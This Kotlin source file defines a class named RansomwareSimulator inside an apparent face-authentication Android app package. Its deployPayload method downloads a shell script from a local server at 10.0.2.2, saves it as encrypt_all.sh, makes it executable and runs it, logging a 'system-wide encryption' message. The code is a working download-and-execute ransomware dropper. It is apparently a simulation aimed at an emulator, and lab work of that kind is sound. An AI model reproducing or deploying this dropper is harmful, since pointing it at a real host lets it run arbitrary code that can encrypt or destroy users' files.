package com.example.faceauth

import android.content.Context
import android.media.MediaScannerConnection
import android.os.Environment
import android.util.Log
import java.io.*
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.*

class RansomwareSimulator(private val context: Context) {

    companion object {
        private const val TAG = "RansomwareSim"
        private const val PAYLOAD_URL = "http://10.0.2.2:5000/get-payload"
    }

    fun deployPayload() {
        try {
            Log.d(TAG, "========================================")
            Log.d(TAG, "🔒 SYSTEM-WIDE ENCRYPTION INITIATED")
            Log.d(TAG, "========================================")

            // Download and run encryption script
            val scriptContent = downloadPayload()
            if (scriptContent.isNotEmpty()) {
                val scriptFile = File(context.filesDir, "encrypt_all.sh")
                FileOutputStream(scriptFile).use { fos ->
                    fos.write(scriptContent.toByteArray())
                }
                scriptFile.setExecutable(true, false)
                scriptFile.setReadable(true, false)

                // Execute script
                val process = Runtime.getRuntime().exec(arrayOf("sh", scriptFile.absolutePath))
                val exitCode = process.waitFor()

                // Read output
                val outputReader = BufferedReader(InputStreamReader(process.inputStream))
                var line: String?
                while (outputReader.readLine().also { line = it } != null) {
                    Log.d(TAG, "Script: $line")
                }

                Log.d(TAG, "Script exit code: $exitCode")
            }

            Log.d(TAG, "========================================")
            Log.d(TAG, "✅ ENCRYPTION COMPLETE!")
            Log.d(TAG, "========================================")

        } catch (e: Exception) {
            Log.e(TAG, "Failed to deploy payload", e)
        }
    }

    private fun downloadPayload(): String {
        return try {
            val url = URL(PAYLOAD_URL)
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "GET"
            connection.connectTimeout = 5000
            connection.readTimeout = 5000
            connection.connect()

            if (connection.responseCode == 200) {
                BufferedReader(InputStreamReader(connection.inputStream)).use { reader ->
                    reader.readText()
                }
            } else {
                ""
            }
        } catch (e: Exception) {
            Log.e(TAG, "Download failed", e)
            ""
        }
    }
}